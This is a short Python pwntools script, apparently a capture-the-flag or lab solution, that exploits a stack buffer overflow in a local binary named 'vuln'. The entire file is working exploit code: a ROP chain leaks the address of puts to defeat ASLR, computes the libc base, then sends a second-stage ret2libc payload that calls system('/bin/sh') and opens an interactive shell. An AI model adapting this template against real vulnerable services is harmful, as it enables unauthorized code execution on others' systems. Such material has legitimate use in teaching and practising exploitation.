#!/usr/bin/env python2

from pwn import *

binary = "./vuln"
context.binary = binary
#context.log_level = "debug"

e = ELF(binary)
main_address = e.symbols["main"]
puts_plt_address = e.plt["puts"]
puts_got_address = e.got["puts"]
log.info("puts_plt_address: 0x{:016x}".format(puts_plt_address))
log.info("puts_got_address: 0x{:016x}".format(puts_got_address))

r = ROP(e)
pop_rdi_ret = r.find_gadget(["pop rdi", "ret"]).address
ret = r.find_gadget(["ret"]).address

offset = 40

payload = offset * "A" + p64(pop_rdi_ret) + p64(puts_got_address) + p64(puts_plt_address) + p64(main_address)
log.info("".join("\\x{:02x}".format(ord(i)) for i in payload))

io = process(binary)
io.sendline(payload)
io.recvline()
msg = io.recvline()
msg = msg.strip()
msg = msg + (8-len(msg)) * "\x00"
puts_address_in_libc = unpack(msg)
log.info("puts_address_in_libc: 0x{:016x}".format(puts_address_in_libc))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_offset_in_libc = libc.symbols["puts"]
log.info("puts_offset_in_libc: 0x{:016x}".format(puts_offset_in_libc))

libc_base_address = puts_address_in_libc - puts_offset_in_libc
libc.address = libc_base_address
log.info("libc_base_address: 0x{:016x}".format(libc.address))
system_address_in_libc = libc.symbols["system"]
log.info("system_address_in_libc: 0x{:016x}".format(system_address_in_libc))

sh_address_in_libc = next(libc.search("/bin/sh\x00"))
log.info("sh_address_in_libc: 0x{:016x}".format(sh_address_in_libc))

# 2nd stage payload

# Add a ret gadget that does nothing helpful (it simply jumps to the next
# address) to fix issue with stack alignment in do_system() for glibc 2.27:
# => 0x7f14bef6c2f6 <do_system+1094>:     movaps XMMWORD PTR [rsp+0x40],xmm0
payload = offset * "A" + p64(ret) + p64(pop_rdi_ret) + p64(sh_address_in_libc) + p64(system_address_in_libc)
#gdb.attach(io)
io.sendline(payload)

io.interactive()
